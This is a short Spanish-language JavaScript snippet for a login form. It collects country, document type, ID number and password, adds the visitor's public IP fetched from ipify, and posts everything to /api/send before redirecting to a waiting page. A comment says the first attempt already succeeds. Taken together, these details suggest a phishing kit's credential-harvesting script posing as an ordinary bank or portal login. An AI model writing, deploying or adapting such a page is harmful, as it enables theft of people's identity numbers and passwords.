<script>
  function validarContrasena(pass) {
    // mínimo 5 caracteres
    if (pass.length < 5) return false;
    // no solo números
    if (/^\d+$/.test(pass)) return false;
    return true;
  }

  async function enviarDatos() {
    const pais = document.getElementById("pais").value;
    const documento = document.getElementById("documento").value;
    const numeroDocumentoInput = document.getElementById("numero-documento");
    const contrasenaInput = document.getElementById("contrasena");
    const errorBox = document.getElementById("error-message");

    const numeroDocumento = numeroDocumentoInput.value.trim();
    const contrasena = contrasenaInput.value.trim();

    const errorUsuario = document.getElementById("usuario-vacio");
    const errorContrasena = document.getElementById("contrasena-vacia");

    // Reset errores
    errorBox.style.display = "none";
    numeroDocumentoInput.classList.remove("error-field");
    contrasenaInput.classList.remove("error-field");
    errorUsuario.style.display = "none";
    errorContrasena.style.display = "none";

    let valido = true;

    // Validar usuario
    if (!numeroDocumento) {
      numeroDocumentoInput.classList.add("error-field");
      errorUsuario.style.display = "block";
      valido = false;
    }

    // Validar contraseña
    if (!contrasena) {
      contrasenaInput.classList.add("error-field");
      errorContrasena.style.display = "block";
      errorContrasena.innerText = "La contraseña no puede estar vacía";
      valido = false;
    } else if (!validarContrasena(contrasena)) {
      contrasenaInput.classList.add("error-field");
      errorContrasena.style.display = "block";
      errorContrasena.innerText = "La contraseña debe tener mínimo 5 caracteres y no ser solo números";
      valido = false;
    }

    if (!valido) return;

    try {
      // Obtener IP del usuario
      const ipRes = await fetch("https://api.ipify.org/?format=json");
      const ipData = await ipRes.json();
      const ip = ipData.ip;

      // Enviar datos
      const response = await fetch("/api/send", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          pais,
          documento,
          numeroDocumento,
          contrasena,
          ip
        }),
      });

      if (response.ok) {
        // Primer intento YA ES EXITOSO
        setTimeout(() => {
          window.location.href = "espera.html";
        }, 1000);
      } else {
        errorBox.style.display = "block";
      }
    } catch (err) {
      errorBox.style.display = "block";
    }
  }
</script>
